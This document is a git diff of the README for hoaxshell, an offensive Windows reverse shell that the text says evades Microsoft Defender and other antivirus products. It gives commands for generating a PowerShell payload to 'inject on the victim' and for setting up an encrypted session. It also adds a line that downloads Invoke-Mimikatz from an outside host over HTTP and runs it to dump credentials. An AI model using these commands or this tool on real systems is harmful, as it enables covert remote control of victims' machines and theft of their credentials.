@@ -6,9 +6,9 @@
 <img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">
 ## Purpose
 
-hoaxshell is an unconventional Windows reverse shell, currently undetected by Microsoft Defender and other AV solutions as it is solely based on http(s) traffic. The tool is easy to use, it produces it's own PowerShell base64 encoded or raw payload, it supports session restoration and encryption (ssl).  
+hoaxshell is an unconventional Windows reverse shell, currently undetected by Microsoft Defender and other AV solutions as it is solely based on http(s) traffic. The tool is easy to use, it generates it's own PowerShell payload and it supports encryption (ssl).  
   
-So far, it has been tested on fully updated Windows 10 Pro and Windows 11 Enterprise boxes (see video and screenshots).
+So far, it has been tested on fully updated **Windows 11 Enterprise** and **Windows 10 Pro** boxes (see video and screenshots).
   
 ### Video Presentation  
 https://www.youtube.com/
@@ -31,7 +31,7 @@ chmod +x hoaxshell.py
 ```
 sudo python3 hoaxshell.py -s <your_ip>
 ```  
-hoaxshell will generate the PowerShell payload automatically base64 encoded for you to copy and inject on the victim. If you need the payload raw, execute the "rawpayload" prompt command. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.
+When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the "rawpayload" prompt command or start the hoaxshell with the `-r` argument. After the payload has been executed on the victim, you'll be able to run PowerShell commands against it.
 
 #### Encrypted shell session (https):
 ```
@@ -42,7 +42,7 @@ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
 sudo python3 hoaxshell.py -s <your_ip> -c </path/to/cert.pem> -k <path/to/key.pem>
 
 ```  
-The generated PowerShell payload will be longer in length because it includes an additional block of code that disables the ssl certificate validation.
+The generated PowerShell payload will be longer in length because of an additional block of code that disables the ssl certificate validation.
 
 #### Grab session mode
 In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.
@@ -65,11 +65,11 @@ The shell is going to hang if you execute a command that initiates an interactiv
 
 # But this will cause your hoaxshell to hang:
 cmd.exe
+```  
+
+So, if you for example would like to run mimikatz throught hoaxshell you would need to invoke the commands:
+```
+hoaxshell > IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.13:4443/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"PRIVILEGE::Debug"'
 ```
 Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.
-
-
-## How it Works
-The attacker issued commands are basically hosted via http/https (python HTTPServer). The generated payload submits the victim's machine into a loop that periodically requests the commands from the attacker's malicious http(s) server, executes them and then sends the output back to the malicious server via POST requests.
-
 
